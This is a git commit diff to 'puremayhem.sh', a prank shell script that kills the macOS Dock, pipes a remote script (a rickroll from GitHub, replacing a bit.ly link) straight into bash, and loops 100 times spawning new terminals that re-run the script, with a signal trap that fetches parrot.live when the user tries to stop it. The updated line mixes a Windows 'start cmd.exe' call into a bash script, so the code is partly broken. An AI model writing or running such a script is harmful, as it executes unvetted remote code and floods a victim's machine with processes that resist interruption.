5b9f36b7756fff36b22590660b11a0eaa34363f8
Clay <clay@Luna.Flint>
2023-02-22 20:50:00 +0200

    Updated link

--- puremayhem.sh
+++ puremayhem.sh
@@ -2,9 +2,9 @@
 #!/bin/bash
 # puremayhem.sh
 killall Dock
-curl -L http://bit.ly/10hA8iC | bash
+curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
 for ((x = 0; x<100; x++)); 
 do
-        osascript -e 'tell application "Terminal" to do script "sh puremayhem.sh"' >/dev/null
+        start cmd.exe/k sh "~/Desktop/puremayhem.sh"
         trap "curl parrot.live" SIGINT SIGTERM
 done
